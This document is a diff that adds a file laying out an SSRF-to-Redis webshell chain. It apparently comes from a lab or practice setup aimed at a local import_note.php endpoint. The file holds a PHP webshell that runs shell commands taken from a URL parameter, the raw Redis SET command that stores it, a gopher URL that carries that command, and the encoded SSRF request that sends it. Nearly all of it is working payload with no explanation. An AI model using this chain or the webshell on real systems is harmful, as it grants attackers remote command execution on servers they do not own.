@@ -1,0 +1,35 @@
+# SSRF -> Redis Webshell Injection
+Webshell Key: session_webshell_demo
+Webshell:
+<?php
+if (isset($_GET['cmd'])) {
+    echo '<pre style="background:black;color:lime;padding:10px;">';
+    system($_GET['cmd']);
+    echo '</pre>';
+} else {
+    echo '<h3>Webshell Ready</h3>';
+    echo '<p>Use ?cmd=command</p>';
+}
+?>
+Redis Command:
+*3
+$3
+SET
+$21
+session_webshell_demo
+$231
+<?php
+if (isset($_GET['cmd'])) {
+    echo '<pre style="background:black;color:lime;padding:10px;">';
+    system($_GET['cmd']);
+    echo '</pre>';
+} else {
+    echo '<h3>Webshell Ready</h3>';
+    echo '<p>Use ?cmd=command</p>';
+}
+?>
+
+Gopher URL:
+gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0ASET%0D%0A%2421%0D%0Asession_webshell_demo%0D%0A%24231%0D%0A%3C%3Fphp%0Aif%20%28isset%28%24_GET%5B%27cmd%27%5D%29%29%20%7B%0A%20%20%20%20echo%20%27%3Cpre%20style%3D%22background%3Ablack%3Bcolor%3Alime%3Bpadding%3A10px%3B%22%3E%27%3B%0A%20%20%20%20system%28%24_GET%5B%27cmd%27%5D%29%3B%0A%20%20%20%20echo%20%27%3C%2Fpre%3E%27%3B%0A%7D%20else%20%7B%0A%20%20%20%20echo%20%27%3Ch3%3EWebshell%20Ready%3C%2Fh3%3E%27%3B%0A%20%20%20%20echo%20%27%3Cp%3EUse%20%3Fcmd%3Dcommand%3C%2Fp%3E%27%3B%0A%7D%0A%3F%3E%0D%0A
+SSRF URL:
+http://localhost:8080/import_note.php?url=gopher%3A//127.0.0.1%3A6379/_%252A3%250D%250A%25243%250D%250ASET%250D%250A%252421%250D%250Asession_webshell_demo%250D%250A%2524231%250D%250A%253C%253Fphp%250Aif%2520%2528isset%2528%2524_GET%255B%2527cmd%2527%255D%2529%2529%2520%257B%250A%2520%2520%2520%2520echo%2520%2527%253Cpre%2520style%253D%2522background%253Ablack%253Bcolor%253Alime%253Bpadding%253A10px%253B%2522%253E%2527%253B%250A%2520%2520%2520%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%250A%2520%2520%2520%2520echo%2520%2527%253C%252Fpre%253E%2527%253B%250A%257D%2520else%2520%257B%250A%2520%2520%2520%2520echo%2520%2527%253Ch3%253EWebshell%2520Ready%253C%252Fh3%253E%2527%253B%250A%2520%2520%2520%2520echo%2520%2527%253Cp%253EUse%2520%253Fcmd%253Dcommand%253C%252Fp%253E%2527%253B%250A%257D%250A%253F%253E%250D%250A
